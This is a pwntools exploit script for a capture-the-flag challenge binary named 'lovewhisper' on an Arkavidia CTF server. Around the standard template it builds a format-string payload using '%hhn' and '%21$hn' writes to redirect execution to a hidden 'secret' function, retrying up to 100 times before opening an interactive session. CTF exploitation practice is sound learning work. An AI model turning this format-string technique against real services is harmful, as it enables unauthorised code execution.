#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host slave1.ctf.arkavidia.id --port 10004 ./lovewhisper
from pwn import *
# from IO_FILE import *
# Set up pwntools for the correct architecture
exe = context.binary = ELF('./lovewhisper')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'slave1.ctf.arkavidia.id'
port = int(args.PORT or 10004)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x080493f2
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)



def exploit():
    secret = 0x08049296

    payload = ''
    payload += 'c' * 12
    payload += '%hhn'
    payload += '%{}c'.format(0x928e) # 0x928e + 12 = 0x929a
    payload += '%21$hn'
    io.sendlineafter('> ', payload)

for i in range(100):
    io = start()
    try:
        exploit()
        leak=io.recv(4090)
        if "you got this" in leak:
            print(leak)
            io.interactive()
            break
    except:
        print(i)
